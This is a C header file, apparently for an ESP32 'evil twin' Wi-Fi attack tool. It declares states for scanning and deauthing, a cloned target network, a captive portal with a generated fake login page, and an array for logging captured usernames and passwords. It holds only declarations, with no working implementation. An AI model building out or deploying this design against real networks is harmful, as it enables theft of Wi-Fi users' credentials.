#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>

typedef enum {
    EVIL_TWIN_DISABLED,
    EVIL_TWIN_SCANNING,
    EVIL_TWIN_DEAUTHING,
    EVIL_TWIN_ACTIVE,
    EVIL_TWIN_CAPTURING
} evil_twin_state_t;

typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    wifi_auth_mode_t auth_mode;
    int32_t rssi;
    bool selected;
} target_network_t;

typedef struct {
    char username[64];
    char password[64];
    unsigned long timestamp;
} captured_credentials_t;

#define MAX_CAPTURED_CREDS 50

// Estados globais
extern evil_twin_state_t evil_twin_mode;
extern target_network_t target_network;
extern DNSServer dns_server;
extern WebServer captive_server;
extern captured_credentials_t captured_creds[MAX_CAPTURED_CREDS];
extern int captured_count;

// Funções principais
void init_evil_twin();
void start_evil_twin_attack(int network_index);
void handle_evil_twin();
void stop_evil_twin();

// Funções auxiliares
void clone_target_network(int network_index);
void start_captive_portal();
void setup_captive_portal_handlers();
String generate_login_page();
String generate_error_page();
void log_credentials(const char* username, const char* password);

#endif
